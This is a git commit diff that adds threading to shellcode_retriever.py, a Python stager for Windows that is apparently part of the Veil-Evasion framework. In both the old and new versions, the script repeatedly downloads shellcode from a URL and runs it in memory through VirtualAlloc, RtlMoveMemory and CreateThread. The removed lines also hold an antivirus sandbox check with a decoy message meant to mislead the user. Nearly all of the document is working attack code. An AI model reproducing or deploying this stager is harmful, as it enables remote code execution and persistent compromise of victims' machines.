84371ecdad4e44db0e9983497a04fe9eeb8fde99
byt3bl33d3r <byt3bl33d3r@gmail.com>
2015-09-16 15:47:36 +0200

    added threading

--- shellcode_retriever.py
+++ shellcode_retriever.py
@@ -1,120 +1,63 @@
-#!/usr/bin/env python
-'''
-    Shellcode Retriever
-
-    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-    
-    Copyright (C) 2013, Joshua Pitts
-
-    License:   GPLv3
-
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    See <http://www.gnu.org/licenses/> for a copy of the GNU General
-    Public License
-
-    This program is to be used for only legal activities by IT security
-    professionals and researchers. Author not responsible for malicious
-    uses.
+#!/usr/bin/env python2.7
 
 '''
+A threaded version of @midnite_runr's shellcode_retriver script (https://github.com/secretsquirrel/shellcode_retriever)
 
-import socket
-import sys
-import urllib2
-import ctypes
-import time
-import signal
+This payload is available in Veil-Evasion (https://github.com/Veil-Framework/Veil-Evasion/blob/master/modules/payloads/python/shellcode_inject/download_inject.py)
 
+If injecting Metepreter shellcode, remember to specify 'thread' as the EXITFUNC in the handler
+'''
 
-#Set to True if you want to beacon every X seconds based
-#on timesleep
-retry = True
-#time to sleep in seconds
-timesleep = 3600 
-opener = urllib2.build_opener()
+from threading import Thread
+from urllib2 import build_opener
+from ctypes import windll, c_int, c_char, pointer
+from time import sleep
 
-
-def sandbox_check():
-    """
-    Quick sandbox check for additional av evasion.
-    And a message to throw the user off.
-    """
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sandbox = True
-    try:
-        s.connect(('127.0.0.1', 445))
-        s.close()
-        sandbox = False
-    except:
-        pass
-
-    if sandbox == True:
-        try:
-            s.connect(('127.0.0.1', 135))
-            s.close()
-        except:
-            #Message to throw the user off:
-            print "Clybase platform checker 2012\nYour platform is:", sys.platform
-            sys.exit(0)
-        
+timesleep = 3600
+shellcode_url = 'URL_GOES_HERE'
+opener = build_opener()
 
 def allocate_exe(shellcode):
     """ 
     ctypes VritualAlloc, MoveMem, and CreateThread 
     From http://www.debasish.in/2012_04_01_archive.html
     """
-    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
+    ptr = windll.kernel32.VirtualAlloc(c_int(0),
+                                       c_int(len(shellcode)),
+                                       c_int(0x3000),
+                                       c_int(0x40))
  
-    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+    buf = (c_char * len(shellcode)).from_buffer(shellcode)
  
-    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                        buf,
-                                        ctypes.c_int(len(shellcode)))
+    windll.kernel32.RtlMoveMemory(c_int(ptr),
+                                  buf,
+                                  c_int(len(shellcode)))
  
-    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(ptr),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.pointer(ctypes.c_int(0)))
+    ht = windll.kernel32.CreateThread(c_int(0),
+                                      c_int(0),
+                                      c_int(ptr),
+                                      c_int(0),
+                                      c_int(0),
+                                      pointer(c_int(0)))
  
-    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
+    windll.kernel32.WaitForSingleObject(c_int(ht), c_int(-1))
 
-
-def get_and_execute(openurl):
-    info = opener.open(openurl)
+def get_and_execute(url):
+    info = opener.open(url)
     shellcode = info.read()
     shellcode = bytearray(shellcode)
     allocate_exe(shellcode)
 
-
 def main():
-    sandbox_check()
-    #set a url below or leave as '' to manually enter
-    openurl = ''
-    if openurl == '':
-        openurl = raw_input("Give me a url: ")
-    try:
-        get_and_execute(openurl)
-        while retry is True:
-            time.sleep(timesleep)
-            get_and_execute(openurl)
-            
-    except Exception, e:
-        #print str(e)
-        pass
-    
+    while True:
+        try:
+            t = Thread(name='get_and_execute', target=get_and_execute, args=(shellcode_url,))
+            t.setDaemon(True)
+            t.start()
+
+            sleep(timesleep)
+        except Exception:
+            pass
+
 if __name__ == "__main__":
-        main()
+    main()
